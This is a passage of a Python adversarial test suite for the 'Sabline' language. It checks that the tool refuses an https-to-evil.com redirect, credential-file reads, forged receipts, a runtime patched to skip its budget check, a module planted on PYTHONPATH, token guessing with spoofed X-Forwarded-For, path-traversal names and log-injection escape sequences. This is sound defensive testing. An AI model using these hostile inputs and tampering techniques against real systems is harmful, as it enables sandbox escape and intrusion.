    prog(d, prog_text)
    code, out, _ = run(["p.vel", "--allow",
                        f"net:api.vendor.example,net:127.0.0.1:{port}"],
                       cwd=d, env={"HTTP_PROXY": f"http://127.0.0.1:{port}"})
    time.sleep(0.3)
    ok("B1 the same program with the proxy granted succeeds",
       code == 0 and "SECRETPAYLOAD" in got.get("req", ""), f"exit {code}")
    # no proxy set -> behaviour has no E317 (identical to before 8.0)
    d = tempfile.mkdtemp()
    prog(d, prog_text)
    code, out, _ = run(["p.vel", "--allow", "net:api.vendor.example"], cwd=d)
    ok("B1 no proxy set -> no E317 (unchanged from 7.2.0)",
       "E317" not in out, out[:120])


def builtin_shadow_cases() -> None:
    """Break 2: a function named like a built-in is E204, not shadowed;
    the 4.3+ give-way built-ins are still allowed."""
    for b in ("print", "env", "read_file", "fetch", "length", "get",
              "split", "now", "random", "post", "to_int"):
        d = tempfile.mkdtemp()
        prog(d, f'fn {b}(x: Text) -> Text {{ return x }}\n'
                'fn main() uses io { print("hi") }\n')
        code, out, _ = run(["check", "p.vel"], cwd=d)
        ok(f"B2 a function named '{b}' -> E204",
           "E204" in out and code != 0, out[:100])
    d = tempfile.mkdtemp()
    prog(d, 'fn money(n: Int) -> Int { return n }\n'
            'fn main() uses io { print(to_text(money(5))) }\n')
    code, out, _ = run(["p.vel", "--allow", "io"], cwd=d)
    ok("B2 a function named 'money' still gives way (SPEC 10.1)",
       code == 0 and "E204" not in out, out[:100])


def credential_break_cases() -> None:
    """Break 3: read_file on a documented credential location is E318;
    a broad fs:read: grant does not cover it; read_file_secret with the
    exact path works."""
    d = tempfile.mkdtemp()
    df = d.replace("\\", "/")
    open(os.path.join(d, "x.pem"), "w").write("PEMDATA")
    # read_file: a plain read leaks the text, so the ok arm prints it - the
    # refusal (E318) is what must stop it before that happens
    prog(d, 'fn main() uses io, fs {\n'
            f'  check read_file("{df}/x.pem") {{ ok v {{ print("LEAK:" + v) }} '
            'fail w { print("f") } }\n}\n')
    code, out, _ = run(["p.vel", "--allow", f"io,fs:read:{df}"], cwd=d)
    ok("B3 read_file on a .pem under a broad grant -> E318, no leak",
       "E318" in out and "PEMDATA" not in out, out[:120])
    # read_file_secret returns a Secret, so the ok arm cannot print it; the
    # refusal here is that the broad grant does not name the credential
    secret_read = ('fn main() uses io, fs {\n'
                   f'  check read_file_secret("{df}/x.pem") '
                   '{ ok v { print("OKREAD") } fail w { print("f") } }\n}\n')
    prog(d, secret_read)
    code, out, _ = run(["p.vel", "--allow", f"io,fs:read:{df}"], cwd=d)
    ok("B3 read_file_secret on a .pem under a broad grant -> E318",
       "E318" in out and "OKREAD" not in out, out[:120])
    # ...and with the exact path named, read_file_secret works
    prog(d, secret_read)
    code, out, _ = run(["p.vel", "--allow", f"io,fs:read:{df}/x.pem"], cwd=d)
    ok("B3 read_file_secret with the exact credential path granted works",
       code == 0 and "OKREAD" in out, out[:120])


def add_redirect_cases() -> None:
    """Break 4: sabline add refuses a redirect from https to http and to a
    host outside the URL's origin. Tested against the opener's own
    redirect handler, so it needs no TLS server."""
    class _Resp:
        headers: dict[str, str] = {}

        def geturl(self) -> str:
            return ""

    def outcome(origin: Any, newurl: Any) -> str:
        import urllib.request
        op = sabline._add_opener(origin)
        handler = next(h for h in op.handlers
                       if h.__class__.__name__ == "AddGuard")
        try:
            handler.redirect_request(urllib.request.Request(origin), _Resp(),
                                     302, "Found", {}, newurl)
            return "allowed"
        except sabline._RedirectRefused as e:
            return f"refused: {e.why}"

    ok("B4 sabline add refuses an https->http redirect",
       "refused" in outcome("https://example.com/lib.vel",
                            "http://example.com/lib.vel"))
    ok("B4 sabline add refuses a redirect to a host outside the origin",
       "refused" in outcome("https://example.com/lib.vel",
                            "https://evil.com/lib.vel"))
    ok("B4 sabline add allows a same-origin https redirect",
       outcome("https://example.com/a.vel", "https://example.com/b.vel")
       == "allowed")


# ---------------------------------------------------------------------------
# The 8.1 pass, kept closed: the prover's names, imports, receipts, eject,
# and the door's rate limit. Each is an attempt from that pass.
# ---------------------------------------------------------------------------
def prover_name_cases() -> None:
    """P1/P2: a parameter or record field named like a name the prover made
    up for itself was the same Z3 value, and a false promise was proven -
    and, compiled to native code, never checked (advisory-prover-names.md)."""
    lie = ("fn g(n: Int) -> Int\n  ensures result > n\n{ return n + 1 }\n"
           "fn f(__g_result_1: Int) -> Int\n"
           "  ensures result == __g_result_1 + 5\n"
           "{ return g(__g_result_1) }\n"
           "fn main() uses io { print(to_text(f(1))) }\n")
    d = tempfile.mkdtemp(dir=WORK)
    prog(d, lie)
    for mode, label in (([], "native"), (["--no-native"], "--no-native")):
        code, out, _ = run(["p.vel", "--allow", "io"] + mode, cwd=d)
        ok(f"P1 a parameter named __g_result_1 proves nothing false "
           f"({label}): the run stops (E601/E700), not prints 2",
           code != 0 and ("E601" in out or "E700" in out), out[:160])
    c = sabline.check(lie, timeout=None, max_memory_mb=None)
    ok("P1 ...and check does not report f proven", "f" not in c.proven,
       str(c.proven))
    boxed = ("record Box { xs: List of Int  xs__n: Int }\n"
             "fn f(b: Box) -> Int\n  requires b.xs__n == 5\n"
             "  ensures result == 5\n{ return length(b.xs) }\n"
             "fn main() uses io { print(to_text(f(Box(xs: [1], xs__n: 5)))) }\n")
    c = sabline.check(boxed, timeout=None, max_memory_mb=None)
    ok("P2 a record field named xs__n is not the length of xs",
       "f" not in c.proven, str(c.proven))


def import_read_cases() -> None:
    """I1/I2: an import of a file that is not Sabline source quoted what it
    found there, through check, audit and run - and so through every door
    (advisory-import-read.md)."""
    d = tempfile.mkdtemp(dir=WORK)
    open(os.path.join(d, ".env"), "w").write("API_KEY_FROM_ENV=sk-live-ABC\n")
    open(os.path.join(d, "notes.txt"), "w").write("hunter2isthepassword x\n")
    for name, token in ((".env", "API_KEY_FROM_ENV"),
                        ("notes.txt", "hunter2isthepassword")):
        src = (f'import "{os.path.join(d, name).replace(os.sep, "/")}"\n'
               f'fn main() uses io {{ print("x") }}\n')
        said = {
            "check": sabline.check(src, timeout=None,
                                   max_memory_mb=None).problems,
            "audit": sabline.audit(src, timeout=None,
                                   max_memory_mb=None).problems,
            "run": sabline.run(src, allow={"io"}).problems}
        for how, problems in said.items():
            text = " ".join(p.message for p in problems)
            ok(f"I1 {how} of a program importing {name} names the file and "
               f"not what it holds", problems and token not in text,
               text[:160])
    root = tempfile.mkdtemp(dir=WORK)
    present = (f'import "{os.path.join(d, "notes.txt").replace(os.sep, "/")}"'
               f'\nfn main() uses io {{ print("x") }}\n')
    missing = present.replace("notes.txt", "no-such-file.txt")
    got = [sabline.check(s, import_root=root).problems
           for s in (present, missing)]
    ok("I2 with import_root, an import outside it is E515 whether or not the "
       "file exists - so nothing about it is told",
       [[p.code for p in g] for g in got] == [["E515"], ["E515"]],
       [[(p.code, p.message[:60]) for p in g] for g in got])


def receipt_leak_cases() -> None:
    """R1-R5: a secret value into a receipt - declassified and printed, into
    a refused host and a refused path, before a kill, and a forged receipt
    file written by the program itself."""
    key = "RK" + os.urandom(6).hex()
    os.environ["ADV_RECEIPT_KEY"] = key

    def leaks(doc: Any) -> bool:
        return key.lower() in json.dumps(doc).lower()

    pre = 'fn main() uses io, env, declassify'
    printed = sabline.run(
        pre + ' {\n    print(declassify(env("ADV_RECEIPT_KEY", ""), "shown"))\n}\n',
        allow={"io", "env", "declassify"})
    ok("R1 a declassified secret the program printed is not in its receipt",
       key in printed.output and not leaks(printed.receipt))
    host = sabline.run(
        pre + ', net {\n'
        '    let h = declassify(env("ADV_RECEIPT_KEY", ""), "a host")\n'
        '    check fetch("https://" + h + ".example.org/") {\n'
        '        ok b { print("x") }\n        fail w { print("no") }\n    }\n}\n',
        allow={"io", "env", "declassify", "net:api.example.com"})
    ok("R2 a refused host built from the secret: E314 in the receipt, the "
       "host not", host.refused_effect and not leaks(host.receipt)
       and cast("dict[str, Any]", host.receipt)["predicate"]["refusals"][0]["code"] == "E314",
       str(cast("dict[str, Any]", host.receipt)["predicate"]["refusals"]))
    path = sabline.run(
        pre + ', fs {\n'
        '    let p = declassify(env("ADV_RECEIPT_KEY", ""), "a path")\n'
        '    write_file(p + ".txt", "x")\n}\n',
        allow={"io", "env", "declassify",
               f"fs:write:{tempfile.mkdtemp(dir=WORK)}"})
    ok("R3 a refused path built from the secret: E313 in the receipt, the "
       "path not", path.refused_effect and not leaks(path.receipt)
       and cast("dict[str, Any]", path.receipt)["predicate"]["refusals"][0]["code"] == "E313",
       str(cast("dict[str, Any]", path.receipt)["predicate"]["refusals"]))
    killed = sabline.run(
        pre + ' {\n'
        '    let k = declassify(env("ADV_RECEIPT_KEY", ""), "before the kill")\n'
        '    let i = 0\n    while i >= 0 {\n        i = i + 1\n'
        '        if i > 1000000 { i = 0 }\n    }\n    print(k)\n}\n',
        allow={"io", "env", "declassify"}, timeout=2)
    ok("R4 a run killed by the clock keeps the declassification it made, and "
       "not the value", killed.timed_out and not leaks(killed.receipt)
       and cast("dict[str, Any]", killed.receipt)["predicate"]["declassifications"][0]["reason"]
       == "before the kill", str(cast("dict[str, Any]", killed.receipt)["predicate"])[:200])
    d = tempfile.mkdtemp(dir=WORK)
    out = os.path.join(d, "receipt.json").replace(os.sep, "/")
    prog(d, 'fn main() uses io, fs {\n'
            f'    write_file("{out}", "{{\\"forged\\": true}}")\n'
            '    print("wrote")\n}\n')
    code, said, _ = run(["p.vel", "--allow", f"io,fs:write:{out}",
                         "--receipt", out], cwd=d)
    doc = json.load(open(out)) if os.path.exists(out) else {}
    ok("R5 a program that writes the --receipt file itself is overwritten by "
       "the real receipt when it ends",
       code == 0 and "forged" not in doc
       and doc.get("predicateType") == sabline.RECEIPT_PREDICATE_TYPE,
       f"{code} {str(doc)[:120]}")


def eject_widening_cases() -> None:
    """E1-E6: a program that tries to widen its own budget once ejected."""
    hello = 'fn main() uses io {\n    print("hello")\n}\n'
    d = tempfile.mkdtemp(dir=WORK)
    prog(d, hello)
    target = os.path.join(d, "ej")
    for label, allow in (("the directory", f"io,fs:write:{target}"),
                         ("the directory through ..",
                          f"io,fs:write:{target}/../ej"),
                         ("its parent", f"io,fs:write:{d}"),
                         ("plain fs", "io,fs")):
        code, out, _ = run(["eject", "p.vel", "-o", target, "--allow", allow],
                           cwd=d)
        ok(f"E1 eject refuses a budget that writes into the ejected "
           f"directory: {label}",
           code == 2 and not os.path.exists(os.path.join(target, "main.py")),
           out[:160])
    code, out, _ = run(["eject", "p.vel", "-o", target], cwd=d)
    launcher = os.path.join(target, "main.py")
    runtime = os.path.join(target, "runtime", "sabline", "budget.py")
    original = open(runtime, "rb").read()
    open(runtime, "wb").write(original.replace(
        b"def spend(", b"def _spend_was(", 1)
        + b"\ndef spend(effect, what, line):\n    return None\n")
    done: subprocess.CompletedProcess[str] | None
    done = subprocess.run([sys.executable, "-I", launcher, "--changed-ok"],
                          capture_output=True, text=True, cwd=d, timeout=120)
    open(runtime, "wb").write(original)
    ok("E2 a runtime with its budget check removed is never run, "
       "--changed-ok or not", done.returncode == 2
       and "runtime/sabline/budget.py" in done.stderr, done.stderr[-160:])
    done = subprocess.run([sys.executable, "-I", launcher, "--receipt",
                           runtime], capture_output=True, text=True, cwd=d,
                          timeout=120)
    ok("E3 main.py refuses a --receipt that would overwrite its runtime",
       done.returncode == 2 and open(runtime, "rb").read() == original,
       done.stderr[-160:])
    done = subprocess.run([sys.executable, "-I", launcher, "--allow=all"],
                          capture_output=True, text=True, cwd=d, timeout=120)
    ok("E4 main.py refuses --allow=all", done.returncode == 2, done.stderr)
    rel = os.path.join(d, "rel")
    # ejected from elsewhere, where ./ is not the directory; launched from
    # the directory itself, where it is
    elsewhere = tempfile.mkdtemp(dir=WORK)
    code, out, _ = run(["eject", os.path.join(d, "p.vel"), "-o", rel,
                        "--allow", "io,fs:write:./"], cwd=elsewhere)
    done = subprocess.run([sys.executable, "-I",
                           os.path.join(rel, "main.py")],
                          capture_output=True, text=True, cwd=rel,
                          timeout=120) if code == 0 else None
    ok("E5 a relative write grant that reaches the directory from where it "
       "is launched is refused there", done is not None
       and done.returncode == 2
       and "write into this directory" in done.stderr,
       out[:160] if done is None else done.stderr[-160:])
    code, out, _ = run(["eject", os.path.join(d, "p.vel"), "-o",
                        os.path.join(d, "site"), "--allow",
                        f"io,fs:write:{os.path.join(d, 'pylib')}"],
                       cwd=elsewhere)
    os.makedirs(os.path.join(d, "pylib"), exist_ok=True)
    env7 = {k: v for k, v in os.environ.items()
            if not k.startswith("PYTHON")}
    env7["PYTHONPATH"] = os.path.join(d, "pylib")
    done = subprocess.run([sys.executable, os.path.join(d, "site", "main.py")],
                          capture_output=True, text=True, cwd=elsewhere,
                          env=env7, timeout=120) if code == 0 else None
    ok("E7 a budget that writes into a directory on PYTHONPATH - where a "
       "planted sitecustomize.py would run in the next Python - is refused "
       "at launch", done is not None and done.returncode == 2
       and "imports from" in done.stderr,
       out[:160] if done is None else done.stderr[-200:])
    drop = tempfile.mkdtemp(dir=WORK)
    marker = os.path.join(drop, "IMPORTED")
    open(os.path.join(drop, "sabline.py"), "w").write(
        f"open(r'{marker}', 'w').write('shadowed')\n")
    env = {k: v for k, v in os.environ.items() if not k.startswith("PYTHON")}
    env["PYTHONPATH"] = drop
    done = subprocess.run([sys.executable, launcher], capture_output=True,
                          text=True, cwd=drop, env=env, timeout=120)
    ok("E6 a sabline.py planted on PYTHONPATH, or in the working directory, "
       "is not the runtime the launcher runs",
       done.returncode == 0 and "hello" in done.stdout
       and not os.path.exists(marker), done.stderr[-160:])


def door_rate_cases() -> None:
    """D1: a caller guessing tokens gets no new allowance from a new wrong
    token or an X-Forwarded-For header, and cannot spend the token's."""
    import socket
    import time
    import urllib.error
    import urllib.request
    with socket.socket() as s:
        s.bind(("127.0.0.1", 0))
        port = s.getsockname()[1]
    token = "adv-rate-" + os.urandom(12).hex()
    door = subprocess.Popen([sys.executable, SABLINE, "serve", "--port",
                             str(port), "--rate-limit", "4"],
                            env=dict(os.environ, SABLINE_TOKEN=token),
                            stdout=subprocess.DEVNULL,
                            stderr=subprocess.DEVNULL)

    def status(headers: Any) -> Any:
        req = urllib.request.Request(f"http://127.0.0.1:{port}/card",
                                     headers=headers)
        try:
            with urllib.request.urlopen(req, timeout=30) as r:
                return r.status
        except urllib.error.HTTPError as e:
            return e.code
        except OSError:
            return None

    try:
        for _ in range(80):
            if status({}) is not None:
                break
            time.sleep(0.25)
        guesses = [status({"Authorization": f"Bearer wrong-{i:04d}-abcdefgh",
                           "X-Forwarded-For": f"10.0.0.{i}"})
                   for i in range(10)]
        held = [status({"Authorization": f"bearer   {token}  "})
                for _ in range(6)]
        ok("D1 new wrong tokens and X-Forwarded-For get no new allowance",
           guesses.count(429) >= 5, str(guesses))
        ok("D1 ...and the token's own allowance is its own, spent once each",
           held[:4] == [200] * 4 and 429 in held, str(held))
    finally:
        door.terminate()
        door.wait(timeout=30)


# ---------------------------------------------------------------------------
# The 64-bit edges, kept closed (8.2). Unary minus was never range-checked:
# -n of the smallest Int is 2**63, which the interpreter returned and native
# code wrapped back to the smallest Int. So `requires n < 0 ensures result >
# 0 { return -n }` was reported proven and, compiled to native code, returned
# a negative number with exit code 0 (advisory-int-negation.md). The smallest
# Int divided by -1 was the same in the interpreter. The release's lie corpus
# (check_prover_lies.py) found it. The promise stays proven - it is true of
# every return - and the run now stops (E407) before a wrong one.
# ---------------------------------------------------------------------------
SMALLEST = "-9223372036854775807 - 1"


def _printed(out: Any, number: Any) -> bool:
    """Whether `number` was printed as a line of its own - a result, not the
    range an error message names."""
    return any(ln.strip() == number for ln in out.splitlines())


def int_edge_cases() -> None:
    d = tempfile.mkdtemp(dir=WORK)
    prog(d, "fn negate(n: Int) -> Int\n    requires n < 0\n"
            "    ensures result > 0\n{\n    return -n\n}\n\n"
            f"fn main() uses io {{\n    print(negate({SMALLEST}))\n}}\n")
    for mode, label in (([], "native"), (["--no-native"], "--no-native")):
        code, out, _ = run(["p.vel", "--allow", "io"] + mode, cwd=d)
        ok(f"N1 -n of the smallest Int where 'result > 0' is proven "
           f"({label}): E407, and no number printed",
           code != 0 and "E407" in out
           and not _printed(out, "-9223372036854775808")
           and not _printed(out, "9223372036854775808"), out[:200])
    prog(d, "fn magnitude(n: Int) -> Int\n    ensures result >= 0\n{\n"
            "    if n < 0 {\n        return -n\n    }\n    return n\n}\n\n"
            f"fn main() uses io {{\n    print(magnitude({SMALLEST}))\n}}\n")
    for mode, label in (([], "native"), (["--no-native"], "--no-native")):
        code, out, _ = run(["p.vel", "--allow", "io"] + mode, cwd=d)
        ok(f"N1 the absolute value of the smallest Int ({label}): E407",
           code != 0 and "E407" in out
           and not _printed(out, "-9223372036854775808"), out[:200])
    prog(d, f"fn main() uses io {{\n    let smallest = {SMALLEST}\n"
            "    let by = -1\n    print(smallest / by)\n}\n")
    code, out, _ = run(["p.vel", "--allow", "io", "--no-native"], cwd=d)
    ok("N2 the smallest Int divided by -1: E407, not 2**63",
       code != 0 and "E407" in out and not _printed(out, "9223372036854775808"),
       out[:200])
    prog(d, "fn main() uses io {\n"
            "    let big = 10000000000.0 * 10000000000.0 * 10000000000.0\n"
            "    print(round(big * big * big * big * big * big * big * big * "
            "big * big * big * big * big * big * big * big * big * big * big * "
            "big * big * big * big * big * big * big * big * big * big * big * "
            "big))\n}\n")
    code, out, _ = run(["p.vel", "--allow", "io"], cwd=d)
    ok("N3 round of an infinity: E407, not a Python traceback",
       code != 0 and "E407" in out and "Traceback" not in out, out[:200])
    prog(d, 'fn main() uses io {\n'
            '    check to_int("99999999999999999999") {\n'
            '        ok v { print("GOT " + to_text(v)) }\n'
            '        fail w { print("refused") }\n    }\n}\n')
    code, out, _ = run(["p.vel", "--allow", "io"], cwd=d)
    ok("N4 to_int of a whole number past 64 bits fails; it is not an Int",
       code == 0 and "refused" in out and "GOT" not in out, out[:200])


# ---------------------------------------------------------------------------
# A local named like a built-in, or like a function of the program: SHADOW-1
# to SHADOW-5. The runtime calls a local only when it holds a function value,
# so after `let print = 0`, `print(k)` prints. Until 8.2 the effect check
# skipped every call to a local's name (1.6 to 8.1.1: a pure function could
# print, or call a function with effects), and so did the Secret check (7.0.0
# to 8.1.1: a Secret could be printed, and the audit said none left).
# ---------------------------------------------------------------------------
def shadow_cases() -> None:
    d = tempfile.mkdtemp(dir=WORK)
    prog(d, "fn leak(k: Secret of Text) uses io {\n    let print = 0\n"
            "    print(k)\n}\n\nfn main() uses io, env {\n"
            "    leak(env(\"SABLINE_SHADOW_SECRET\", \"\"))\n}\n")
    code, out, _ = run(["check", "p.vel"], cwd=d)
    ok("SHADOW-1 a Secret given to print through a local named print is "
       "refused by check (E560)", code != 0 and "E560" in out, out[:200])
    code, out, _ = run(["p.vel", "--allow", "io,env"], cwd=d,
                       env={"SABLINE_SHADOW_SECRET": "shadow-secret-value"})
    ok("SHADOW-1 ...and a run under --allow io,env prints no secret",
       code != 0 and "shadow-secret-value" not in out, out[:200])
    prog(d, "fn leak(k: Text) {\n    let print = 0\n    print(k)\n}\n\n"
            "fn main() uses io {\n    leak(\"said\")\n}\n")
    code, out, _ = run(["check", "p.vel"], cwd=d)
    ok("SHADOW-2 a pure function calling print through a local named print "
       "is refused (E300)", code != 0 and "E300" in out, out[:200])
    prog(d, "fn leak(print: Int, k: Text) {\n    print(k)\n}\n\n"
            "fn main() uses io {\n    leak(0, \"said\")\n}\n")
    code, out, _ = run(["check", "p.vel"], cwd=d)
    ok("SHADOW-3 ...and through a parameter named print (E300)",
       code != 0 and "E300" in out, out[:200])
    prog(d, "fn shout() uses io {\n    print(\"loud\")\n}\n\n"
            "fn quiet() {\n    let shout = 0\n    shout()\n}\n\n"
            "fn main() uses io {\n    quiet()\n}\n")
    code, out, _ = run(["check", "p.vel"], cwd=d)
    ok("SHADOW-4 a pure function calling one of the program's functions that "
       "has effects, through a local of the same name, is refused (E300)",
       code != 0 and "E300" in out, out[:200])
    prog(d, "fn apply(print: fn(Int) -> Int) -> Int {\n    return print(1)\n}"
            "\n\nfn inc(n: Int) -> Int {\n    return n + 1\n}\n\n"
            "fn main() uses io {\n    print(to_text(apply(inc)))\n}\n")
    code, out, _ = run(["p.vel"], cwd=d)
    ok("SHADOW-5 a parameter of function type named print still calls the "
       "function it was given, and stays pure",
       code == 0 and _printed(out, "2"), out[:200])


# ---------------------------------------------------------------------------
# The split into a package (8.2): SPLIT-1 and SPLIT-2. Until 8.1.1 Sabline was
# one module, so `sabline.IMPORT_ROOT = root` set the global the runtime read.
# In the package the run state lives in sabline.state; a read of
# sabline.IMPORT_ROOT was forwarded there, and a write, until the adversarial
# pass of 8.2, set an attribute nothing read - so imports silently stopped
# being confined.
# ---------------------------------------------------------------------------
def split_cases() -> None:
    d = tempfile.mkdtemp(dir=WORK)
    served, outside = os.path.join(d, "served"), os.path.join(d, "outside")
    os.makedirs(served)
    os.makedirs(outside)
    with open(os.path.join(outside, "lib.vel"), "w", encoding="utf-8") as f:
        f.write("fn answer() -> Int {\n    return 42\n}\n")
    snippet = (
        "import sys\n"
        "sys.path.insert(0, sys.argv[1])\n"
        "import sabline\n"
        "sabline.IMPORT_ROOT = sys.argv[2]\n"
        "src = ('import \"../outside/lib.vel\" as lib\\n'\n"
        "       'fn main() uses io {\\n    print(to_text(lib.answer()))\\n}\\n')\n"
        "r = sabline.run(src, path=sys.argv[3], allow={'io'})\n"
        "print('RUN', 'ok' if r.ok else 'refused',"
        " ','.join(p.code for p in r.problems), r.output.strip())\n"
        "sabline.MAX_READ_BYTES = 1234\n"
        "print('STATE', sabline.state.MAX_READ_BYTES, sabline.MAX_READ_BYTES)\n")
    done = subprocess.run(
        [sys.executable, "-c", snippet, os.path.dirname(os.path.abspath(SABLINE)),
         served, os.path.join(served, "main.vel")],
        capture_output=True, text=True, timeout=300)
    out = done.stdout + done.stderr
    ok("SPLIT-1 sabline.IMPORT_ROOT = root, written on the package, still "
       "confines imports: an import from outside the root is E515",
       "RUN refused E515" in out and "42" not in out.split("STATE")[0],
       out[-300:])
    ok("SPLIT-2 ...and any run-state name written on the package reaches "
       "sabline.state", "STATE 1234 1234" in out, out[-300:])


def release_83_cases() -> None:
    """8.3's adversarial pass: sabline eval (EV), receipts diff (RD), replay
    (RP), witnesses (WT), the log sinks (LG) and the verifier (VF)."""
    import hashlib
    print("\n8.3: eval, receipts diff, replay, witnesses, log sinks, verify")
    d = os.path.realpath(tempfile.mkdtemp(prefix="adv83-",
                                          dir=os.path.realpath(str(WORK))))
    hello = prog(d, 'fn main() uses io {\n    print("hi")\n}\n', "hello.vel")
    os.makedirs(os.path.join(d, "out"), exist_ok=True)
    receipt = os.path.join(d, "r.json")

    # EV1: spellings of a grant the profile refuses
    for allow in ("IO,NET", "io,,net", "net@0", "io,ffi:MATH", "io, env",
                  "io,net:127.0.0.1", "io,fs:read@2"):
        if os.path.exists(receipt):
            os.remove(receipt)
        code, out, _ = run(["eval", hello, "--allow", allow, "--receipt",
                            receipt], cwd=d)
        ok(f"EV1 eval refuses --allow {allow!r}: exit 2, no receipt",
           code == 2 and not os.path.exists(receipt), out[-200:])
    # EV2: a receipt path that reaches a granted directory through a link
    link = os.path.join(d, "link")
    try:
        os.symlink(os.path.join(d, "out"), link, target_is_directory=True)
        code, out, _ = run(["eval", hello, "--allow", "io,fs:write:out",
                            "--receipt", os.path.join(link, "r.json")], cwd=d)
        ok("EV2 a receipt reached through a link into the write grant is "
           "refused", code == 2 and "inside the budget" in out, out[-200:])
    except (OSError, NotImplementedError):
        print("SKIP  EV2 this system will not make a symbolic link here")
    # EV3: the program writes where the receipt goes; the budget refuses it,
    # and the receipt eval writes is a receipt of that refusal
    forger = prog(d, 'fn main() uses io, fs {\n    write_file("'
                  + receipt.replace("\\", "/") + '", "{}")\n}\n', "forge.vel")
    code, out, _ = run(["eval", forger, "--allow", "io,fs:write:out",
                        "--receipt", receipt], cwd=d)
    got = json.load(open(receipt, encoding="utf-8")) \
        if os.path.exists(receipt) else {}
    ok("EV3 a program that writes to its own receipt's path is refused "
       "(E313), and the receipt is eval's, recording that",
       got.get("predicateType") == sabline.RECEIPT_PREDICATE_TYPE
       and got.get("predicate", {}).get("exit", {}).get("code") == "E313",
       out[-300:])
    # EV4: a child-process marker in eval's environment lifts no limit
    spin = prog(d, "fn main() uses io {\n    let i = 0\n    while i >= 0 {\n"
                "        i = i + 1\n    }\n}\n", "spin.vel")
    code, out, secs = run(["eval", spin, "--receipt", receipt, "--timeout",
                           "2"], cwd=d, env={"SABLINE_CHECK_CHILD": "1"},
                          timeout=120)
    ok("EV4 SABLINE_CHECK_CHILD=1 in eval's environment does not lift its "
       "time limit", code == 124 and secs < 90, f"{code} {secs:.0f}s")

    # RD1: a receipt that lies about which program ran
    run(["eval", hello, "--receipt", receipt], cwd=d)
    honest = json.load(open(receipt, encoding="utf-8"))
    lying = json.loads(json.dumps(honest))
    lying["subject"][0]["digest"]["sha256"] = hashlib.sha256(
        b"another program").hexdigest()
    liar = os.path.join(d, "liar.json")
    json.dump(lying, open(liar, "w", encoding="utf-8"))
    code, out, _ = run(["receipts", "diff", liar, "--audit", hello], cwd=d)
    ok("RD1 a receipt that names other bytes than the audited program is a "
       "difference (exit 1)", code == 1 and "subject" in out, out[-300:])
    # RD2: text in a receipt that would forge a line of the report
    forged = json.loads(json.dumps(honest))
    forged["predicate"]["declassifications"] = [{
        "reason": "x\nclean: no difference\x1b[2K", "line": 1, "times": 1}]
    tricky = os.path.join(d, "tricky.json")
    json.dump(forged, open(tricky, "w", encoding="utf-8"))
    code, out, _ = run(["receipts", "diff", tricky, "--audit", hello], cwd=d)
    ok("RD2 a reason holding a line feed and an escape cannot forge a line "
       "of receipts diff's report",
       code == 1 and "clean: no difference" not in out.splitlines()
       and "\x1b" not in out, repr(out[-300:]))
    # RD3: a receipt type Sabline does not define
    other = dict(honest, predicateType="https://velaris.dev/receipt/v1")
    json.dump(other, open(tricky, "w", encoding="utf-8"))
    code, out, _ = run(["receipts", "diff", tricky, "--audit", hello], cwd=d)
    ok("RD3 receipts diff does not read a receipt of velaris.dev's type",
       code == 2, out[-200:])

    # RP1: subject names that leave the directory replay reads from
    canary = os.path.join(os.path.dirname(d), "adv83-canary.vel")
    with open(canary, "w", encoding="utf-8", newline="\n") as fh:
        fh.write('fn main() uses io {\n    print("RAN-OUTSIDE")\n}\n')
    digest = hashlib.sha256(open(canary, "rb").read()).hexdigest()
    for name in ("../adv83-canary.vel", "<stdlib>/../../adv83-canary.vel",
                 canary.replace("\\", "/"), "a/../../adv83-canary.vel",
                 "sub\\..\\..\\adv83-canary.vel"):
        leaving = json.loads(json.dumps(honest))
        leaving["subject"] = [{"name": name, "digest": {"sha256": digest}}]
        path = os.path.join(d, "leave.json")
        json.dump(leaving, open(path, "w", encoding="utf-8"))
        code, out, _ = run(["replay", path, "--max-allow", "all"], cwd=d)
        ok(f"RP1 replay refuses the subject {name!r}, and runs nothing "
           f"outside", code == 2 and "RAN-OUTSIDE" not in out, out[-200:])
    # RP2: an eval receipt whose budget was widened to net
    widened = json.loads(json.dumps(honest))
    widened["predicate"]["budget"] = "io,net"
    path = os.path.join(d, "widened.json")
    json.dump(widened, open(path, "w", encoding="utf-8"))
    code, out, _ = run(["replay", path, "--max-allow", "all"], cwd=d)
    ok("RP2 an eval receipt given net is refused even under --max-allow all",
       code == 2 and "RAN" not in out, out[-200:])

    # WT1: witnesses run with no effect granted, and leave the budget as found
    from sabline import state as _run_state
    from sabline import witnesses as _witnesses
    pure = prog(d, 'fn size(p: Text) -> Int\n    requires length(p) > 0\n'
                '    ensures result > 0\n{\n    return length(p)\n}\n\n'
                'fn save(p: Text) -> Int uses fs\n    requires length(p) > 0\n'
                '{\n    write_file("canary.txt", p)\n    return 1\n}\n\n'
                'fn main() uses io {\n    print("x")\n}\n', "pure.vel")
    before = (set(_run_state.EFFECT_BUDGET), _run_state.FS_GRANTS,
              _run_state.STOP_FILE)
    report = _witnesses.from_contracts(os.path.join(d, pure), count=5)
    after = (set(_run_state.EFFECT_BUDGET), _run_state.FS_GRANTS,
             _run_state.STOP_FILE)
    ok("WT1 nothing a witness run would write is written, and the process's "
       "budget is as it was",
       before == after and not os.path.exists(os.path.join(d, "canary.txt"))
       and not os.path.exists("canary.txt"),
       (before, after, report.get("problems")))
    if HAVE_Z3:
        # without the prover no witness is made at all, so there is no run
        # to refuse: the report says so and the case above still holds
        ok("WT1 ...and the function with an effect is refused, never run on "
           "a witness (z3)",
           any(r.get("refused") for r in report.get("functions", [])),
           report.get("problems"))

    # LG1: characters that start, end or rewrite a line, through the log. In
    # this process: a console's standard input turns CR into a line end
    # before read_line sees it, and cannot carry every character
    import shutil as _shutil
    _shutil.copy(os.path.join(str(HERE), "stdlib", "log.vel"),
                 os.path.join(d, "log.vel"))
    logs_path = os.path.join(d, "logs.vel")
    logs_src = ('import "log.vel" as log\n\nfn main() uses io {\n'
                '    let bad = read_line()\n    log(bad)\n    log.warn(bad)\n}\n')
    with open(logs_path, "w", encoding="utf-8", newline="\n") as fh:
        fh.write(logs_src)
    for label, text in (("U+2028", "a FAKE"), ("NEL (U+0085)", "a\x85FAKE"),
                        ("a lone CR", "a\rFAKE"),
                        ("an OSC 8 hyperlink", "a\x1b]8;;http://x\x07FAKE"),
                        ("DEL", "a\x7fFAKE"), ("NUL", "a\x00FAKE")):
        got = sabline.run(logs_src, path=logs_path, allow="io",
                          stdin=text + "\n")
        lines = [x for x in got.logs.split("\n") if x]
        ok(f"LG1 {label} in a logged value stays on the value's own line",
           got.ok and len(lines) == 2 and all("FAKE" in x for x in lines)
           and not any(c in got.logs for c in
                       ("\x1b", "\x85", " ", "\r", "\x7f", "\x00")),
           repr(got.logs[-200:]))
